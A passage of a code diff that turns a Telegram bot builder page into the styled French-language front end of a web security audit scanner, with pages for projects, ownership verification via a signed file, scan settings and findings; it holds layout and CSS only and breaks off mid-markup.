@@ -1,801 +1,1501 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Telegram Bot Builder</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>ZOMBIE HACKING — Security Audit</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,400&family=Bebas+Neue&display=swap" rel="stylesheet"/>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=DM+Sans:wght@400;500;700&display=swap');
-
 :root {
-  --bg: #fafaf9;
-  --surface: #ffffff;
-  --border: #e7e5e4;
-  --text: #1c1917;
-  --muted: #78716c;
-  --accent: #2563eb;
-  --accent-light: #dbeafe;
-  --success: #16a34a;
-  --success-light: #dcfce7;
-  --amber: #f59e0b;
-  --amber-light: #fef3c7;
-  --red: #dc2626;
-  --shadow: rgba(0,0,0,0.04);
-  --shadow-md: rgba(0,0,0,0.08);
-  --radius: 16px;
-  --serif: 'Instrument Serif', serif;
-  --sans: 'DM Sans', sans-serif;
+  --bg:      #050708;
+  --surf:    #0c0f13;
+  --surf2:   #111519;
+  --border:  #1c2530;
+  --border2: #243040;
+  --acc:     #00e5ff;
+  --acc2:    #00ff99;
+  --red:     #ff2d55;
+  --orange:  #ff9500;
+  --purple:  #bf5af2;
+  --muted:   #3d5060;
+  --text:    #b8ccd8;
+  --text2:   #6a8090;
+  --mono:    'DM Mono', monospace;
+  --display: 'Bebas Neue', sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+html,body{height:100%;overflow:hidden}
+
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:var(--mono);
+  display:flex;
+  flex-direction:column;
 }
 
-* { box-sizing: border-box; margin: 0; padding: 0; }
-
-body {
-  font-family: var(--sans);
-  background: var(--bg);
-  color: var(--text);
-  -webkit-font-smoothing: antialiased;
-  overflow-x: hidden;
-  padding-bottom: 2rem;
+/* ── Scanline overlay ── */
+body::after{
+  content:'';
+  position:fixed;inset:0;
+  background:repeating-linear-gradient(180deg,transparent,transparent 2px,rgba(0,229,255,.012) 3px);
+  pointer-events:none;z-index:9999;
 }
 
-/* Header */
-header {
-  background: var(--surface);
-  border-bottom: 1px solid var(--border);
-  padding: 1.25rem 1.5rem;
-  position: sticky;
-  top: 0;
-  z-index: 100;
-  backdrop-filter: blur(12px);
-  background: rgba(255,255,255,0.85);
+/* ── Layout ── */
+.layout{display:flex;flex:1;overflow:hidden}
+
+/* ── Sidebar ── */
+.sidebar{
+  width:220px;flex-shrink:0;
+  background:var(--surf);
+  border-right:1px solid var(--border);
+  display:flex;flex-direction:column;
+  overflow:hidden;
+}
+.sidebar-header{
+  padding:20px 16px 16px;
+  border-bottom:1px solid var(--border);
+}
+.brand{
+  font-family:var(--display);
+  font-size:1.5rem;letter-spacing:.06em;
+  color:var(--acc);
+  text-shadow:0 0 24px rgba(0,229,255,.4);
+  line-height:1;
+}
+.brand-sub{
+  font-size:.6rem;color:var(--muted);
+  letter-spacing:.15em;margin-top:6px;
+}
+.version-tag{
+  display:inline-block;margin-top:8px;
+  background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.2);
+  color:var(--acc);padding:2px 8px;border-radius:3px;font-size:.62rem;letter-spacing:.1em;
 }
 
-.logo {
-  display: flex;
-  align-items: center;
-  gap: 0.75rem;
+.nav{flex:1;padding:12px 0;overflow-y:auto}
+.nav-item{
+  display:flex;align-items:center;gap:10px;
+  padding:10px 16px;cursor:pointer;
+  font-size:.75rem;letter-spacing:.06em;color:var(--text2);
+  border-left:2px solid transparent;
+  transition:all .15s;
+}
+.nav-item:hover{color:var(--text);background:rgba(255,255,255,.03)}
+.nav-item.active{color:var(--acc);border-left-color:var(--acc);background:rgba(0,229,255,.05)}
+.nav-icon{font-size:.9rem;width:16px;text-align:center}
+.nav-badge{
+  margin-left:auto;background:rgba(255,45,85,.15);
+  border:1px solid rgba(255,45,85,.3);color:var(--red);
+  padding:1px 6px;border-radius:10px;font-size:.62rem;
 }
 
-.logo-icon {
-  width: 36px;
-  height: 36px;
-  background: linear-gradient(135deg, #2563eb, #3b82f6);
-  border-radius: 10px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
+.sidebar-footer{
+  padding:12px 16px;border-top:1px solid var(--border);
+  font-size:.65rem;color:var(--muted);
+}
+.status-dot{
+  display:inline-block;width:6px;height:6px;border-radius:50%;
+  background:var(--muted);margin-right:6px;
+  transition:background .3s;
+}
+.status-dot.online{background:var(--acc2);box-shadow:0 0 6px var(--acc2)}
+
+/* ── Main ── */
+.main{flex:1;overflow-y:auto;overflow-x:hidden}
+.main::-webkit-scrollbar{width:4px}
+.main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+
+.page{display:none;padding:28px 32px 60px;max-width:1000px}
+.page.active{display:block}
+
+/* ── Page header ── */
+.page-title{
+  font-family:var(--display);font-size:2rem;letter-spacing:.06em;
+  color:var(--text);margin-bottom:6px;
+}
+.page-desc{font-size:.75rem;color:var(--muted);margin-bottom:28px;letter-spacing:.06em}
+
+/* ── Cards ── */
+.card{
+  background:var(--surf);border:1px solid var(--border);
+  border-radius:8px;padding:20px;margin-bottom:16px;
+}
+.card-title{
+  font-size:.65rem;color:var(--muted);letter-spacing:.14em;
+  text-transform:uppercase;margin-bottom:14px;
+  display:flex;align-items:center;gap:8px;
+}
+.card-title::after{content:'';flex:1;height:1px;background:var(--border)}
+
+.card-row{display:flex;gap:16px;margin-bottom:16px}
+.card-row .card{flex:1;margin-bottom:0}
+
+/* ── Form ── */
+.field{margin-bottom:14px}
+.field label{display:block;font-size:.68rem;color:var(--muted);letter-spacing:.1em;margin-bottom:6px}
+.field input,.field select,.field textarea{
+  width:100%;background:rgba(0,0,0,.3);
+  border:1px solid var(--border2);border-radius:5px;
+  color:var(--text);font-family:var(--mono);font-size:.82rem;
+  padding:9px 12px;outline:none;transition:border-color .2s;
+}
+.field input:focus,.field select:focus,.field textarea:focus{border-color:var(--acc)}
+.field textarea{resize:vertical;min-height:70px}
+
+/* ── Buttons ── */
+.btn{
+  display:inline-flex;align-items:center;gap:7px;
+  padding:9px 18px;border-radius:5px;border:none;
+  font-family:var(--mono);font-size:.78rem;letter-spacing:.05em;
+  cursor:pointer;transition:all .18s;white-space:nowrap;
+}
+.btn-primary{background:var(--acc);color:#000;font-weight:500;box-shadow:0 0 16px rgba(0,229,255,.2)}
+.btn-primary:hover:not(:disabled){box-shadow:0 0 28px rgba(0,229,255,.45);transform:translateY(-1px)}
+.btn-primary:disabled{opacity:.35;cursor:not-allowed;transform:none}
+.btn-danger{background:rgba(255,45,85,.12);color:var(--red);border:1px solid rgba(255,45,85,.25)}
+.btn-danger:hover{background:rgba(255,45,85,.2)}
+.btn-ghost{background:rgba(255,255,255,.04);color:var(--text);border:1px solid var(--border2)}
+.btn-ghost:hover{border-color:var(--acc);color:var(--acc)}
+.btn-sm{padding:6px 12px;font-size:.72rem}
+
+/* ── Badges ── */
+.badge{
+  display:inline-block;padding:2px 9px;border-radius:20px;
+  font-size:.65rem;letter-spacing:.07em;font-weight:500;
+}
+.badge-ok    {background:rgba(0,255,153,.1);color:var(--acc2);border:1px solid rgba(0,255,153,.25)}
+.badge-err   {background:rgba(255,45,85,.1);color:var(--red);border:1px solid rgba(255,45,85,.25)}
+.badge-warn  {background:rgba(255,149,0,.1);color:var(--orange);border:1px solid rgba(255,149,0,.25)}
+.badge-info  {background:rgba(0,229,255,.1);color:var(--acc);border:1px solid rgba(0,229,255,.25)}
+.badge-purple{background:rgba(191,90,242,.1);color:var(--purple);border:1px solid rgba(191,90,242,.25)}
+
+/* ── Stats row ── */
+.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
+.stat{
+  background:var(--surf);border:1px solid var(--border);
+  border-radius:7px;padding:16px;text-align:center;
+}
+.stat-n{font-family:var(--display);font-size:2.2rem;line-height:1;letter-spacing:.04em}
+.stat-l{font-size:.62rem;color:var(--muted);margin-top:4px;letter-spacing:.1em}
+
+/* ── Terminal ── */
+.terminal{
+  background:#020406;border:1px solid var(--border);
+  border-radius:6px;padding:14px;font-size:.74rem;line-height:1.75;
+  max-height:320px;overflow-y:auto;font-family:var(--mono);
+}
+.terminal::-webkit-scrollbar{width:3px}
+.terminal::-webkit-scrollbar-thumb{background:var(--border2)}
+.tl{display:block}
+.t-ok{color:var(--acc2)}.t-err{color:var(--red)}.t-warn{color:var(--orange)}
+.t-info{color:var(--acc)}.t-dim{color:var(--muted)}.t-purple{color:var(--purple)}
+
+/* ── Progress ── */
+.prog-wrap{background:var(--border);border-radius:3px;height:3px;margin:10px 0;overflow:hidden}
+.prog-bar{height:100%;background:linear-gradient(90deg,var(--acc),var(--acc2));border-radius:3px;transition:width .4s;width:0;box-shadow:0 0 8px var(--acc)}
+
+/* ── Table ── */
+.tbl{width:100%;border-collapse:collapse;font-size:.74rem}
+.tbl th{text-align:left;padding:8px 12px;border-bottom:1px solid var(--border);color:var(--muted);font-weight:400;letter-spacing:.08em;font-size:.65rem}
+.tbl td{padding:9px 12px;border-bottom:1px solid rgba(28,37,48,.7);vertical-align:top}
+.tbl tr:hover td{background:rgba(255,255,255,.015)}
+.td-payload{color:var(--orange);word-break:break-all;max-width:240px;font-size:.71rem}
+.td-url{color:var(--acc);font-size:.68rem;word-break:break-all;max-width:200px}
+
+/* ── Project item ── */
+.proj-item{
+  display:flex;align-items:center;gap:12px;
+  padding:12px 14px;border:1px solid var(--border);border-radius:7px;
+  margin-bottom:8px;cursor:pointer;transition:all .18s;
+}
+.proj-item:hover{border-color:var(--border2);background:rgba(255,255,255,.02)}
+.proj-item.selected{border-color:var(--acc);background:rgba(0,229,255,.04)}
+.proj-domain{font-size:.85rem;flex:1}
+.proj-meta{font-size:.67rem;color:var(--muted)}
+
+/* ── Steps ── */
+.step{display:flex;gap:14px;padding:14px 0;border-bottom:1px solid var(--border)}
+.step:last-child{border-bottom:none}
+.step-n{
+  width:26px;height:26px;border-radius:50%;flex-shrink:0;margin-top:2px;
+  display:flex;align-items:center;justify-content:center;font-size:.72rem;
+  background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.25);color:var(--acc);
+}
+.step-n.done{background:rgba(0,255,153,.1);border-color:rgba(0,255,153,.3);color:var(--acc2)}
+.step-body h4{font-size:.82rem;color:var(--text);margin-bottom:5px}
+.step-body p{font-size:.73rem;color:var(--text2);line-height:1.6}
+code{
+  background:rgba(0,229,255,.07);border:1px solid rgba(0,229,255,.18);
+  color:var(--acc);padding:1px 6px;border-radius:3px;font-size:.85em;
 }
 
-.logo-icon svg { width: 20px; height: 20px; fill: white; }
-
-.logo-text h1 {
-  font-family: var(--serif);
-  font-size: 1.125rem;
-  font-weight: 400;
-  font-style: italic;
-  letter-spacing: -0.3px;
+/* ── PP file box ── */
+.pp-box{
+  background:#010305;border:1px solid rgba(0,229,255,.2);border-radius:6px;
+  padding:14px;font-size:.72rem;color:var(--acc);
+  white-space:pre;overflow-x:auto;margin:12px 0;max-height:220px;overflow-y:auto;
+  box-shadow:inset 0 0 24px rgba(0,229,255,.04);
 }
 
-.logo-text span {
-  font-size: 0.75rem;
-  color: var(--muted);
+/* ── DNA grid ── */
+.dna-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin-top:10px}
+.dna-card{
+  border:1px solid var(--border2);border-radius:6px;padding:11px 13px;
+  background:rgba(0,0,0,.2);transition:border-color .2s;
+}
+.dna-card:hover{border-color:var(--border2)}
+.dna-id{font-size:.68rem;letter-spacing:.12em;margin-bottom:4px}
+.dna-name{font-size:.73rem;color:var(--text)}
+.dna-meta{font-size:.65rem;color:var(--muted);margin-top:4px}
+
+/* ── Stack chip ── */
+.stack-chip{
+  display:inline-flex;align-items:center;gap:5px;
+  padding:3px 10px;border-radius:4px;font-size:.68rem;
+  background:rgba(191,90,242,.1);border:1px solid rgba(191,90,242,.2);color:var(--purple);
 }
 
-/* Container */
-.container {
-  max-width: 640px;
-  margin: 0 auto;
-  padding: 1.5rem;
+/* ── Toggles ── */
+.toggle-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
+.toggle-item{
+  display:flex;align-items:center;gap:7px;padding:8px 10px;
+  border:1px solid var(--border);border-radius:5px;cursor:pointer;
+  transition:all .15s;font-size:.74rem;
 }
+.toggle-item.on{border-color:var(--border2);background:rgba(255,255,255,.03)}
+.toggle-item input{accent-color:var(--acc);cursor:pointer;width:13px;height:13px}
 
-/* Section */
-.section {
-  background: var(--surface);
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  padding: 1.5rem;
-  margin-bottom: 1.5rem;
-  box-shadow: 0 1px 3px var(--shadow);
+/* ── Spinner ── */
+.spin{
+  display:inline-block;width:12px;height:12px;
+  border:2px solid rgba(0,229,255,.15);border-top-color:var(--acc);
+  border-radius:50%;animation:rot .65s linear infinite;
 }
+@keyframes rot{to{transform:rotate(360deg)}}
 
-.section-title {
-  font-family: var(--serif);
-  font-size: 1.125rem;
-  font-style: italic;
-  margin-bottom: 1.25rem;
-  display: flex;
-  align-items: center;
-  gap: 0.5rem;
+/* ── Toast ── */
+#toast{
+  position:fixed;bottom:20px;right:20px;
+  background:var(--surf);border:1px solid var(--border2);
+  border-radius:6px;padding:10px 16px;font-size:.76rem;
+  max-width:300px;z-index:9998;
+  transform:translateY(60px);opacity:0;transition:all .25s;
+  box-shadow:0 8px 24px rgba(0,0,0,.6);
 }
-
-.section-title::after {
-  content: '';
-  flex: 1;
-  height: 1px;
-  background: var(--border);
-}
-
-/* Form */
-.field {
-  margin-bottom: 1.25rem;
-}
-
-.field:last-child { margin-bottom: 0; }
-
-label {
-  display: block;
-  font-size: 0.875rem;
-  font-weight: 500;
-  color: var(--text);
-  margin-bottom: 0.5rem;
-  letter-spacing: -0.2px;
-}
-
-label .required {
-  color: var(--red);
-  margin-left: 2px;
-}
-
-input[type="text"],
-input[type="password"],
-textarea {
-  width: 100%;
-  padding: 0.875rem 1rem;
-  border: 1.5px solid var(--border);
-  border-radius: 12px;
-  font-family: var(--sans);
-  font-size: 0.9375rem;
-  background: var(--surface);
-  transition: all 0.2s;
-  color: var(--text);
-}
-
-input:focus,
-textarea:focus {
-  outline: none;
-  border-color: var(--accent);
-  box-shadow: 0 0 0 3px var(--accent-light);
-}
-
-textarea {
-  resize: vertical;
-  min-height: 70px;
-  line-height: 1.5;
-}
-
-.hint {
-  font-size: 0.8125rem;
-  color: var(--muted);
-  margin-top: 0.375rem;
-}
-
-/* Function card */
-.function-card {
-  border: 1.5px solid var(--border);
-  border-radius: 12px;
-  padding: 1rem;
-  margin-bottom: 1rem;
-  background: var(--bg);
-  transition: all 0.2s;
-}
-
-.function-card.active {
-  border-color: var(--accent);
-  background: var(--accent-light);
-}
-
-.function-header {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  margin-bottom: 0.75rem;
-}
-
-.function-name {
-  font-weight: 600;
-  font-size: 0.9375rem;
-  letter-spacing: -0.2px;
-}
-
-.function-desc {
-  font-size: 0.8125rem;
-  color: var(--muted);
-  margin-bottom: 0.75rem;
-  line-height: 1.5;
-}
-
-/* Toggle switch */
-.toggle {
-  position: relative;
-  width: 44px;
-  height: 24px;
-  cursor: pointer;
-}
-
-.toggle input {
-  opacity: 0;
-  width: 0;
-  height: 0;
-}
-
-.toggle-slider {
-  position: absolute;
-  inset: 0;
-  background: #d6d3d1;
-  border-radius: 12px;
-  transition: all 0.3s;
-}
-
-.toggle-slider::before {
-  content: '';
-  position: absolute;
-  width: 18px;
-  height: 18px;
-  left: 3px;
-  top: 3px;
-  background: white;
-  border-radius: 50%;
-  transition: all 0.3s;
-  box-shadow: 0 1px 3px rgba(0,0,0,0.15);
-}
-
-.toggle input:checked + .toggle-slider {
-  background: var(--accent);
-}
-
-.toggle input:checked + .toggle-slider::before {
-  transform: translateX(20px);
-}
-
-/* Buttons */
-.btn {
-  width: 100%;
-  padding: 1rem 1.5rem;
-  border-radius: 12px;
-  font-family: var(--sans);
-  font-size: 0.9375rem;
-  font-weight: 600;
-  cursor: pointer;
-  border: none;
-  transition: all 0.2s;
-  letter-spacing: -0.2px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 0.5rem;
-}
-
-.btn-primary {
-  background: var(--accent);
-  color: white;
-  box-shadow: 0 1px 3px var(--shadow-md);
-}
-
-.btn-primary:active {
-  transform: scale(0.98);
-}
-
-.btn-primary:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-}
-
-.btn-secondary {
-  background: var(--surface);
-  border: 1.5px solid var(--border);
-  color: var(--text);
-}
-
-/* Status banner */
-.status-banner {
-  padding: 1rem;
-  border-radius: 12px;
-  font-size: 0.875rem;
-  margin-bottom: 1.5rem;
-  display: flex;
-  align-items: flex-start;
-  gap: 0.75rem;
-  line-height: 1.5;
-}
-
-.status-banner.info {
-  background: var(--accent-light);
-  color: var(--accent);
-  border: 1px solid var(--accent);
-}
-
-.status-banner.success {
-  background: var(--success-light);
-  color: var(--success);
-  border: 1px solid var(--success);
-}
-
-.status-banner.warning {
-  background: var(--amber-light);
-  color: #92400e;
-  border: 1px solid var(--amber);
-}
-
-.status-banner svg {
-  flex-shrink: 0;
-  margin-top: 1px;
-}
-
-/* Steps */
-.steps {
-  display: flex;
-  align-items: center;
-  gap: 0.5rem;
-  margin-bottom: 1.5rem;
-  padding: 0 0.5rem;
-}
-
-.step {
-  flex: 1;
-  height: 3px;
-  background: var(--border);
-  border-radius: 2px;
-  transition: all 0.3s;
-}
-
-.step.active { background: var(--accent); }
-
-/* Loading spinner */
-.spinner {
-  width: 18px;
-  height: 18px;
-  border: 2px solid rgba(255,255,255,0.3);
-  border-top-color: white;
-  border-radius: 50%;
-  animation: spin 0.6s linear infinite;
-}
-
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-/* Code display */
-.code-block {
-  background: #1c1917;
-  color: #fafaf9;
-  padding: 1rem;
-  border-radius: 12px;
-  font-family: 'Courier New', monospace;
-  font-size: 0.8125rem;
-  overflow-x: auto;
-  line-height: 1.6;
-  margin-top: 1rem;
-}
-
-.code-block::-webkit-scrollbar { height: 6px; }
-.code-block::-webkit-scrollbar-track { background: transparent; }
-.code-block::-webkit-scrollbar-thumb { background: #57534e; border-radius: 3px; }
-
-/* Expandable */
-.expandable-content {
-  max-height: 0;
-  overflow: hidden;
-  transition: max-height 0.3s ease-out;
-}
-
-.expandable-content.open {
-  max-height: 500px;
-}
-
-/* Mobile optimization */
-@media (max-width: 640px) {
-  .container { padding: 1rem; }
-  .section { padding: 1.25rem; }
-  header { padding: 1rem 1.25rem; }
-}
-
-/* Floating deploy button on mobile */
-@media (max-width: 640px) {
-  .deploy-sticky {
-    position: fixed;
-    bottom: 1rem;
-    left: 1rem;
-    right: 1rem;
-    z-index: 50;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-  }
-}
+#toast.show{transform:translateY(0);opacity:1}
 </style>
 </head>
 <body>
 
-<header>
-  <div class="logo">
-    <div class="logo-icon">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.394 13.9l-2.967-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.761.659z"/>
-      </svg>
-    </div>
-    <div class="logo-text">
-      <h1>Bot Builder</h1>
-      <span>No code · Deploy instantly</span>
-    </div>
-  </div>
-</header>
+<div class="layout">
 
-<div class="container">
-  <!-- Steps -->
-  <div class="steps">
-    <div class="step active" id="step-1"></div>
-    <div class="step" id="step-2"></div>
-    <div class="step" id="step-3"></div>
-  </div>
-
-  <!-- Status -->
-  <div class="status-banner info" id="status-banner">
-    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-      <circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>
-    </svg>
-    <div>Configure your bot credentials, choose functions, then deploy to Cloudflare Workers in one click.</div>
-  </div>
-
-  <!-- Config -->
-  <div class="section">
-    <div class="section-title">Credentials</div>
-
-    <div class="field">
-      <label>Telegram Bot Token <span class="required">*</span></label>
-      <input type="password" id="telegram-token" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz">
-      <div class="hint">Get from @BotFather on Telegram</div>
+  <!-- ── SIDEBAR ── -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <div class="brand">ZOMBIE</div>
+      <div class="brand" style="color:var(--acc2)">HACKING</div>
+      <div class="brand-sub">AUTONOMOUS SECURITY AUDIT</div>
+      <div class="version-tag">v4.0 · ATTACK DNA</div>
     </div>
 
-    <div class="field">
-      <label>Cloudflare API Token <span class="required">*</span></label>
-      <input type="password" id="cf-token" placeholder="Your Cloudflare API token">
-      <div class="hint">Create at cloudflare.com → My Profile → API Tokens</div>
-    </div>
-
-    <div class="field">
-      <label>Cloudflare Account ID <span class="required">*</span></label>
-      <input type="text" id="cf-account" placeholder="abc123def456">
-      <div class="hint">Find in Cloudflare dashboard → Workers & Pages</div>
-    </div>
-
-    <div class="field">
-      <label>Worker Name</label>
-      <input type="text" id="worker-name" placeholder="my-telegram-bot" value="telegram-bot">
-      <div class="hint">Lowercase, no spaces</div>
-    </div>
-  </div>
-
-  <!-- Functions -->
-  <div class="section">
-    <div class="section-title">Bot Functions</div>
-
-    <!-- /start -->
-    <div class="function-card" data-func="start">
-      <div class="function-header">
-        <div class="function-name">/start command</div>
-        <label class="toggle">
-          <input type="checkbox" checked data-toggle="start">
-          <span class="toggle-slider"></span>
-        </label>
+    <nav class="nav">
+      <div class="nav-item active" data-page="projects">
+        <span class="nav-icon">📁</span> Projets
       </div>
-      <div class="function-desc">First message users see when starting the bot</div>
-      <div class="expandable-content open">
-        <textarea id="msg-start" placeholder="Welcome message">Hello! I'm your bot. Use /help to see available commands.</textarea>
+      <div class="nav-item" data-page="verify">
+        <span class="nav-icon">🔐</span> Vérification
+      </div>
+      <div class="nav-item" data-page="scan">
+        <span class="nav-icon">🔬</span> Scanner
+      </div>
+      <div class="nav-item" data-page="findings">
+        <span class="nav-icon">💥</span> Failles
+        <span class="nav-badge" id="nav-findings-count" style="display:none">0</span>
+      </div>
+      <div class="nav-item" data-page="dna">
+        <span class="nav-icon">🧬</span> Attack DNA
+      </div>
+      <div class="nav-item" data-page="memory">
+        <span class="nav-icon">🧠</span> Mémoire
+      </div>
+    </nav>
+
+    <div class="sidebar-footer">
+      <span class="status-dot" id="db-dot"></span>
+      <span id="db-status">IndexedDB...</span>
+    </div>
+  </aside>
+
+  <!-- ── MAIN ── -->
+  <main class="main">
+
+    <!-- PAGE: PROJECTS -->
+    <div class="page active" id="page-projects">
+      <div class="page-title">Projets</div>
+      <div class="page-desc">GÉREZ VOS CIBLES D'AUDIT · MULTI-PROJET · MÉMOIRE PARTAGÉE</div>
+
+      <div class="card-row">
+        <div class="card" style="flex:1.2">
+          <div class="card-title">Nouveau projet</div>
+          <div class="field">
+            <label>URL du projet à auditer</label>
+            <input type="url" id="new-url" placeholder="https://monprojet.com"/>
+          </div>
+          <div class="field">
+            <label>Nom du projet</label>
+            <input type="text" id="new-name" placeholder="Mon App"/>
+          </div>
+          <button class="btn btn-primary" id="btn-create">
+            ➕ Créer &amp; générer zombiehack.pp
+          </button>
+        </div>
+
+        <div class="card" style="flex:2">
+          <div class="card-title">Projets enregistrés</div>
+          <div id="project-list">
+            <p style="color:var(--muted);font-size:.78rem">Aucun projet — créez-en un.</p>
+          </div>
+        </div>
       </div>
     </div>
 
-    <!-- /help -->
-    <div class="function-card" data-func="help">
-      <div class="function-header">
-        <div class="function-name">/help command</div>
-        <label class="toggle">
-          <input type="checkbox" checked data-toggle="help">
-          <span class="toggle-slider"></span>
-        </label>
+    <!-- PAGE: VERIFY -->
+    <div class="page" id="page-verify">
+      <div class="page-title">Vérification</div>
+      <div class="page-desc">PREUVE DE PROPRIÉTÉ · SIGNATURE CRYPTOGRAPHIQUE RSA-2048</div>
+
+      <div id="verify-no-proj" class="card" style="color:var(--muted);font-size:.82rem">
+        Sélectionnez d'abord un projet dans l'onglet Projets.
       </div>
-      <div class="function-desc">Shows available commands</div>
-      <div class="expandable-content open">
-        <textarea id="msg-help" placeholder="Help message">Available commands:
-/start - Start the bot
-/help - Show this help
-/ping - Check bot status</textarea>
+
+      <div id="verify-content" style="display:none">
+        <div class="card">
+          <div class="card-title">Comment ça fonctionne</div>
+          <p style="font-size:.78rem;color:var(--text2);margin-bottom:16px;line-height:1.7">
+            Le fichier <code>zombiehack.pp</code> contient votre domaine, votre clé publique RSA-2048
+            et une signature cryptographique unique. Sans votre clé privée (stockée localement dans IndexedDB,
+            jamais transmise), ce fichier est impossible à forger pour un domaine que vous ne contrôlez pas.
+          </p>
+          <div class="step">
+            <div class="step-n" id="step1-n">1</div>
+            <div class="step-body">
+              <h4>Téléchargez votre zombiehack.pp</h4>
+              <p>Fichier signé avec votre clé privée locale. Unique par domaine et par instance HTML.</p>
+              <br/>
+              <button class="btn btn-primary btn-sm" id="btn-download-pp">⬇ Télécharger zombiehack.pp</button>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-n" id="step2-n">2</div>
+            <div class="step-body">
+              <h4>Placez-le sur votre serveur</h4>
+              <p>Chemin exact : <code id="pp-path-display"></code></p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-n" id="step3-n">3</div>
+            <div class="step-body">
+              <h4>Vérifiez la propriété</h4>
+              <p>On va fetch le fichier, vérifier la signature RSA, l'origine HTML et le domaine.</p>
+              <br/>
+              <button class="btn btn-primary btn-sm" id="btn-verify">🔍 Vérifier</button>
+              <span id="verify-result" style="margin-left:12px;font-size:.76rem"></span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Aperçu zombiehack.pp</div>
+          <div class="pp-box" id="pp-preview"></div>
+        </div>
       </div>
     </div>
 
-    <!-- Welcome new members -->
-    <div class="function-card" data-func="welcome">
-      <div class="function-header">
-        <div class="function-name">Welcome new members</div>
-        <label class="toggle">
-          <input type="checkbox" data-toggle="welcome">
-          <span class="toggle-slider"></span>
-        </label>
+    <!-- PAGE: SCAN -->
+    <div class="page" id="page-scan">
+      <div class="page-title">Scanner</div>
+      <div class="page-desc">DNA ATTACK ENGINE · MUTATIONS TYPE-AWARE · HYBRIDES SURFACE-AWARE · PRIORISATION PAR STACK</div>
+
+      <div id="scan-no-proj" class="card" style="color:var(--muted);font-size:.82rem">
+        Sélectionnez un projet vérifié pour lancer un scan.
       </div>
-      <div class="function-desc">Auto-greet when someone joins the group</div>
-      <div class="expandable-content">
-        <textarea id="msg-welcome" placeholder="Welcome message">Welcome {name} to the group! 👋</textarea>
-        <div class="hint" style="margin-top:0.5rem">Use {name} for member's name</div>
+
+      <div id="scan-content" style="display:none">
+
+        <!-- Stack detected -->
+        <div class="card" id="stack-card" style="display:none">
+          <div class="card-title">Stack détecté</div>
+          <div id="stack-display"></div>
+        </div>
+
+        <div class="card-row">
+          <div class="card" style="flex:1">
+            <div class="card-title">Configuration</div>
+            <div class="field">
+              <label>Profondeur d'attaque</label>
+              <select id="scan-depth">
+                <option value="seeds">Seeds seulement (rapide)</option>
+                <option value="mutations" selected>Seeds + Mutations DNA</option>
+                <option value="full">Seeds + Mutations + Hybrides</option>
+              </select>
+            </div>
+            <div class="field">
+              <label>Délai entre requêtes (ms)</label>
+              <input type="text" id="scan-delay" value="300"/>
+            </div>
+          </div>
+
+          <div class="card" style="flex:1.6">
+            <div class="card-title">Familles actives</div>
+            <div class="toggle-grid" id="family-toggles"></div>
+          </div>
+        </div>
+
+        <div style="display:flex;gap:10px;align-items:center">
+          <button class="btn btn-primary" id="btn-start-scan">🔬 Lancer le scan</button>
+          <button class="btn btn-danger btn-sm" id="btn-stop-scan" style="display:none">⏹ Stopper</button>
+          <span id="scan-summary" style="font-size:.76rem;color:var(--muted)"></span>
+        </div>
+      </div>
+
+      <!-- Running panel -->
+      <div class="card" id="running-card" style="display:none;margin-top:16px">
+        <div class="card-title">Scan en cours</div>
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
+          <div class="spin" id="scan-spin"></div>
+          <span id="scan-status" style="font-size:.78rem"></span>
+        </div>
+        <div class="prog-wrap"><div class="prog-bar" id="prog"></div></div>
+        <div class="terminal" id="scan-log"></div>
       </div>
     </div>
 
-    <!-- Auto-reply -->
-    <div class="function-card" data-func="autoreply">
-      <div class="function-header">
-        <div class="function-name">Auto-reply to all messages</div>
-        <label class="toggle">
-          <input type="checkbox" data-toggle="autoreply">
-          <span class="toggle-slider"></span>
-        </label>
+    <!-- PAGE: FINDINGS -->
+    <div class="page" id="page-findings">
+      <div class="page-title">Failles détectées</div>
+      <div class="page-desc">INDEXEDDB · PERSISTANT · MULTI-PROJETS</div>
+
+      <div class="stats-row">
+        <div class="stat">
+          <div class="stat-n" style="color:var(--acc2)" id="s-total">0</div>
+          <div class="stat-l">TOTAL FAILLES</div>
+        </div>
+        <div class="stat">
